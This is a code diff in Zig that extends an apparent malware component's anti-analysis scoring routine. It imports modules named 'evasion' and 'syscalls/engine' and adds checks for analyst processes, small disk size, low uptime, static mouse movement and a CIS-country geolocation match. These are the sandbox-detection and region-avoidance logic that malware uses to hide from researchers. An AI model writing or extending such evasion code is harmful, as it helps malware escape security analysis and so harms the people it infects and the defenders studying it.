@@ -3,6 +3,8 @@ const types = @import("../types/types.zig");
 const config = @import("config");
 const engine = @import("../syscalls/engine.zig");
 const evasion = @import("evasion.zig");
+const detection = @import("detection.zig");
+const process_list = @import("process_list.zig");
 const dbg = @import("../syscalls/dbg.zig");
 
 pub const AnalysisResult = struct {
@@ -14,13 +16,17 @@ pub const AnalysisResult = struct {
         timing_anomaly: bool = false,
         debugger: bool = false,
         small_screen: bool = false,
-        _unused: u26 = 0,
+        process_list: bool = false,
+        disk_small: bool = false,
+        uptime_low: bool = false,
+        mouse_static: bool = false,
+        geo_cis: bool = false,
+        _unused: u21 = 0,
     },
 };
 
 pub fn runAll() AnalysisResult {
     var result = AnalysisResult{ .score = 0, .flags = .{} };
-
 
     const ram = evasion.getTotalPhysicalRam();
     if (ram) |r| {
@@ -65,6 +71,44 @@ pub fn runAll() AnalysisResult {
                 result.flags.small_screen = true;
             }
         }
+    }
+
+    if (process_list.isSuspiciousProcessRunning()) {
+        result.score += 15;
+        result.flags.process_list = true;
+    }
+
+    if (detection.checkDiskSize()) |small| {
+        if (small) {
+            result.score += 15;
+            result.flags.disk_small = true;
+        }
+    } else {
+        result.score += 5;
+    }
+
+    if (detection.checkUptime()) |low| {
+        if (low) {
+            result.score += 15;
+            result.flags.uptime_low = true;
+        }
+    } else {
+        result.score += 5;
+    }
+
+    if (detection.checkMouseMovement()) |static_mouse| {
+        if (static_mouse) {
+            result.score += 10;
+            result.flags.mouse_static = true;
+        }
+    } else {
+        result.score += 5;
+    }
+
+    const geo = detection.checkGeoBlock();
+    if (geo.matched >= 2) {
+        result.score += 30;
+        result.flags.geo_cis = true;
     }
 
     return result;
